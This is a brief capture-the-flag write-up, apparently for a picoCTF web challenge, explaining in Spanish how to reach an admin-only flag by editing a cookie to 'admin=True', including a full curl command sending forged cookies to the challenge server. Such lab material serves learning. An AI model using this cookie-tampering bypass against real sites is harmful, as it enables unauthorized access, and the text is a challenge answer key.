## Descripcion
The factory is hiding things from all of its users.Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:62308
## Solucion
Mediante un cookie editor, se le cambia la cookie de administrador a true
o
Mediante la terminal mediante el comando 
curl -s [http://fickle-tempest.picoctf.net:56502/flag](http://fickle-tempest.picoctf.net:56502/flag) -H "Cookie: password=carlos; username=carlos; admin=True" | grep pico

## Notas

## Referencias

